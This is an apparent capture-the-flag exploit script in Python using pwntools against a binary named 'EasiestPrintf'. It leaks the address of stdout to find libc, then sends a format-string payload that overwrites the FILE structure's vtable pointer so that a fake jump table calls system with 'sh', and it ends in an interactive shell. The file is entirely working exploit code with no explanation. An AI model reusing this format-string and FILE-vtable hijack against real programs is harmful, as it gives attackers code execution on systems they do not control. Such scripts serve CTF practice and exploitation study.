#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./EasiestPrintf"
#  context.log_level = "debug"
elf = context.binary

if sys.argv[1] == "l":
    io = process("./EasiestPrintf")
    libc = elf.libc

else:
    io = process("././EasiestPrintf", env = {"LD_PRELOAD": "./libc.so.6_0ed9bad239c74870ed2db31c735132ce"})
    libc = ELF("./libc.so.6_0ed9bad239c74870ed2db31c735132ce")
    
io.sendlineafter("read:\n", str(elf.sym['stdout']))

_IO_2_1_stdout_ = int(io.recvline().strip(), 16)
_IO_file_jumps = _IO_2_1_stdout_ + 0x94
libc.address = _IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
success("libc -> {:#x}".format(libc.address))
success("_IO_2_1_stdout_ -> {:#x}".format(_IO_2_1_stdout_))
success("_IO_file_jumps -> {:#x}".format(_IO_file_jumps))

new_IO_file_jumps = _IO_2_1_stdout_ + 0x150
writes = {
        _IO_file_jumps: new_IO_file_jumps,
        new_IO_file_jumps + 0x1c: libc.sym['system'],
        _IO_2_1_stdout_: u32("sh\0\0")
        }
payload = fmtstr_payload(7, writes, write_size = "short")

raw_input("DEBUG: ")
io.sendlineafter("Bye\n", payload)

io.interactive()
